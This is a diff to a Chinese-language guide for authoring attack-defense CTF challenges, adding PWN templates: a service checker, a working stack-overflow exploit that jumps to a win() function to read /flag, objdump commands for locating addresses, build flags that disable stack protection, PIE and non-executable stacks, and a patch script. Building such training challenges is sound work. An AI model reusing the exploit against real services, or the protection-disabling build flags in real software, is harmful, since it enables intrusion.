@@ -174,12 +174,77 @@ except requests.RequestException as exc:
     print(f"DOWN {exc}")
 ```
 
+### PWN Checker 代码模板
+
+PWN 题 Checker 用 `socket` 而非 `requests`，且**必须兼容 Windows**（见下方注意事项）。
+
+```python
+#!/usr/bin/env python3
+"""AWDP Checker for PWN BOF Service"""
+import os
+import sys
+import socket
+
+host = os.environ["AWDP_TARGET_HOST"]
+port = int(os.environ["AWDP_TARGET_PORT"])
+flag = os.environ["AWDP_FLAG"]
+
+TIMEOUT = 5
+
+def check_service():
+    """Check service is reachable and responds."""
+    try:
+        sock = socket.create_connection((host, port), timeout=TIMEOUT)
+        sock.settimeout(0.5)
+        try:
+            data = sock.recv(4096)
+        except socket.timeout:
+            data = b""
+        sock.close()
+        if len(data) > 0:
+            return True, ""
+        else:
+            return False, "no data received from service"
+    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
+        return False, str(exc)
+
+def check_flag_integrity():
+    """Verify the expected banner/prompt is served correctly."""
+    try:
+        sock = socket.create_connection((host, port), timeout=TIMEOUT)
+        resp = sock.recv(4096)
+        sock.close()
+        resp_str = resp.decode("latin-1", errors="replace")
+
+        # Check for known banner keywords
+        if "expected_keyword" not in resp_str:
+            return False, f"unexpected banner: {resp_str[:80]}"
+
+        return True, ""
+    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
+        return False, str(exc)
+
+if __name__ == "__main__":
+    ok, err = check_service()
+    if not ok:
+        print(f"DOWN service unreachable: {err}")
+        sys.exit(0)
+
+    ok, err = check_flag_integrity()
+    if not ok:
+        print(f"MUMBLE service response mismatch: {err}")
+        sys.exit(0)
+
+    print("OK service is healthy and flag is accessible")
+```
+
 ### Checker 约定
 - 单次运行 5-10 秒内完成
 - 所有网络请求设置 `timeout`
 - **不输出完整 Flag**
 - 输出可定位原因，但不泄漏敏感数据
 - 成功退出码为 0；异常使用非 0
+- **跨平台兼容**：不要用 `socket.MSG_DONTWAIT`（Windows 不支持），改用 `sock.settimeout()` + try/except `socket.timeout`
 
 ## Exp 规范
 
@@ -218,10 +283,84 @@ except requests.RequestException:
 sys.exit(0 if expected in response.text else 1)
 ```
 
+### PWN Exp 代码模板
+
+PWN 题 Exp 使用 `socket` + `struct` 发送二进制 payload。**关键注意事项**：
+
+1. **x86_64 栈对齐**：`movaps` 指令要求 16 字节对齐。如果 payload 直接跳 `win()` 会崩溃，必须在 ROP 链前插入 `ret` gadget
+2. **偏移量**：通过 pwntools `cyclic` 或 GDB 确定缓冲区到返回地址的偏移
+3. **地址**：用 `objdump -t binary | grep win` 获取目标函数地址，用 `objdump -d binary | grep ret` 获取 ret gadget
+
+```python
+#!/usr/bin/env python3
+"""AWDP Exp for PWN BOF Service - exploits stack buffer overflow to read /flag"""
+import os
+import sys
+import socket
+import struct
+
+host = os.environ["AWDP_TARGET_HOST"]
+port = int(os.environ["AWDP_TARGET_PORT"])
+expected = os.environ["AWDP_FLAG"]
+
+TIMEOUT = 5
+BUFFER_OFFSET = 72          # 64-byte buffer + 8-byte saved RBP
+RET_GADGET = 0x40101a       # ret instruction (fixes 16-byte stack alignment)
+WIN_ADDR = 0x4011f6          # win() function that prints /flag
+
+def exploit():
+    sock = socket.create_connection((host, port), timeout=TIMEOUT)
+    sock.recv(1024)  # Read banner
+
+    # ROP: padding + ret gadget (align stack) + win() address
+    payload = (
+        b"A" * BUFFER_OFFSET +
+        struct.pack("<Q", RET_GADGET) +
+        struct.pack("<Q", WIN_ADDR) +
+        b"\n"
+    )
+    sock.send(payload)
+
+    import time
+    time.sleep(0.5)
+    response = sock.recv(4096)
+    sock.close()
+
+    return response.decode("latin-1", errors="replace")
+
+if __name__ == "__main__":
+    try:
+        resp = exploit()
+    except Exception as exc:
+        print(f"Exploit error: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+    if expected in resp:
+        print("Exploit success: flag obtained", file=sys.stderr)
+        sys.exit(0)
+    else:
+        print(f"Exploit failed: flag not found", file=sys.stderr)
+        sys.exit(1)
+```
+
+### 获取二进制偏移量（出题时）
+
+```bash
+# 在编译好的二进制上执行
+objdump -t /path/to/binary | grep win        # 找 win() 地址
+objdump -d /path/to/binary | grep "ret$"     # 找 ret gadget 地址
+```
+
+编译选项必须关闭保护：
+```makefile
+CFLAGS = -fno-stack-protector -no-pie -z execstack
+```
+
 ### Exp 要求
 - 稳定、可重复
 - 不依赖随机竞争或外部公网服务
 - 处理网络异常（timeout、连接拒绝 = 对方已下线或修补）
+- PWN 题必须通过 `objdump` 确认地址正确，不可用占位符
 
 ## 修补包规范
 
@@ -253,22 +392,52 @@ fi
 exit 0
 ```
 
-### 修补包目录结构
+### PWN update.sh 模板
 
+PWN 题修补包用 `update.sh` 替换编译好的二进制并重启服务进程。
+
+```bash
+#!/bin/sh
+set -eu
+
+# PWN 题修补：替换编译好的二进制
+install -m 0755 ./files/login_service /home/ctf/login_service
+
+# 用 pkill 重启 xinetd 管理的服务进程
+if command -v pkill >/dev/null 2>&1; then
+    pkill -HUP login_service || true
+fi
+
+# 如果 pkill 不够，也可以直接杀掉所有服务进程让 xinetd 重新拉起
+# pkill login_service || true
+
+exit 0
+```
+
+修补包目录结构：
 ```
 patch/
 ├── update.sh
 └── files/
-    └── app.py
+    └── login_service      # 修补后的二进制
 ```
 
-### 打包命令
-
+打包方式与 Web 题相同：
 ```bash
 cd patch
-tar -czf ../ssti-fix-v1.tgz update.sh files
-tar -tzf ../ssti-fix-v1.tgz   # 验证
+tar -czf ../bof-fix-v1.tgz update.sh files
+tar -tzf ../bof-fix-v1.tgz   # 验证内容
 ```
+
+### 修补验证流程
+
+出题后必须验证修补闭环：
+1. 构建原始镜像 → 启动容器
+2. 运行 Checker → 应输出 `OK`
+3. 运行 Exp → 应 exit 0（漏洞存在）
+4. 应用补丁（上传 tgz 到容器，执行 `tar -xzf patch.tgz && cd patch && sh update.sh`）
+5. 再次运行 Checker → 应仍输出 `OK`（服务正常）
+6. 再次运行 Exp → 应 exit 非 0（漏洞已修复）
 
 ## 服务设计的安全考虑
 
